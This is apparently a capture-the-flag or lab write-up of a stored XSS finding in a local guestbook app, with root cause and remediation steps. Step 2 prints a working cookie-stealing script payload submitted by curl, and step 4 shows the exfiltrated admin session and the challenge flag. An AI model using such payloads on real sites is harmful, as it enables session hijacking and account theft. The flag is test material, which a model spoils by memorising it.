# Finding 3: Stored XSS — Guestbook Cookie Theft

**Flag:** `FLAG{xss_155a65fe9ec1}`

## Steps

1. Viewed `/guestbook` — comments are rendered to every visitor, including
   an admin account that periodically reviews new comments.

2. Submitted a comment containing a `<script>` payload that reads
   `document.cookie` and sends it to an attacker-controlled endpoint
   (`/grab`, used here as the exfiltration sink):
   ```
   curl -b alice_cookies.txt -X POST http://127.0.0.1:5050/guestbook \
     --data-urlencode "comment=<script>fetch('/grab?'+document.cookie)</script>"
   ```

3. The comment body was stored and rendered to other visitors (including the
   admin) **without HTML-escaping**, so the browser executed it as a real
   `<script>` tag rather than displaying it as text.

4. When the admin's session loaded the guestbook page, the injected script
   ran with the admin's cookies in scope and sent `document.cookie` to
   `/grab`. Checked the exfiltration endpoint:
   ```
   curl http://127.0.0.1:5050/grab
   ```
   Response showed the stolen admin session value:
   ```
   session=admin; flag=FLAG{xss_155a65fe9ec1}
   ```

## Root cause
User-supplied comment text is inserted into the guestbook page without
output encoding/escaping, so any HTML/JS an attacker submits is rendered and
executed in the context of every other visitor's browser — including an
admin's — allowing session/cookie theft (classic stored XSS).

## Remediation
- Escape all user-supplied content on output (Jinja2 autoescaping should be
  on and not bypassed with `|safe` for this field).
- Set the session cookie `HttpOnly` so client-side JavaScript cannot read it
  via `document.cookie` even if a script does execute.
- Add a Content-Security-Policy header restricting script sources, as
  defense-in-depth against injected inline scripts.
- Sanitize/strip HTML from free-text fields like guestbook comments if raw
  HTML is never actually needed.
